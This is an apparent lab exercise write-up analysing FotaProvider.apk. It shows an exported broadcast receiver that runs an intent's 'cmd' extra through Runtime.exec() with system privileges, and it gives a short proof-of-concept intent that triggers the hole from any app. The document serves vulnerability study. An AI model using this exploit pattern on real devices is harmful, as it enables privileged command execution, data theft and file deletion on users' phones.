# Exercise 3 

The goal of this analysis is to reverse engineer the FotaProvider.apk application and identify any code paths that allow execution of arbitrary shell commands. The focus is on determining whether an attacker-controlled application can exploit this path to execute commands as the system user.

1. Decompilation and Manifest Inspection
Using jadx to reverse engineer the APK, we begin by examining AndroidManifest.xml. We identify a suspicious exported broadcast receiver:

```xml
<receiver android:name=".WriteCommandReceiver">
    <intent-filter>
        <action android:name="android.intent.action.AdupsFota.operReceiver" />
    </intent-filter>
</receiver>
```

This broadcast receiver is exported by default, allowing any app on the device to send it intents.

2. Bytecode Analysis of WriteCommandReceiver :
   
Inside the receiver’s onReceive() method, the application handles incoming intents and processes the "cmd" extra as follows:

```java
public void onReceive(Context context, Intent intent) {
    String command = intent.getStringExtra("cmd");
    Runtime.getRuntime().exec(command);
}
```

3. Vulnerability :

Any application on the device can send a broadcast with action android.intent.action.AdupsFota.operReceiver.

If the broadcast includes an extra string with key "cmd", the receiver will execute the command using Runtime.exec().

This execution occurs with the system user's privileges, second only to root.

🧪 Exploitation Proof-of-Concept
An attacker app could exploit this by sending a broadcast intent as shown below:

```java
Intent intent = new Intent("android.intent.action.AdupsFota.operReceiver");
intent.putExtra("cmd", "ls /data");  // Or any other command
context.sendBroadcast(intent);
```
This allows full command execution with high privileges, which could be used to:
- Read sensitive data
- Delete files
- Install/uninstall apps
- Modify system settings

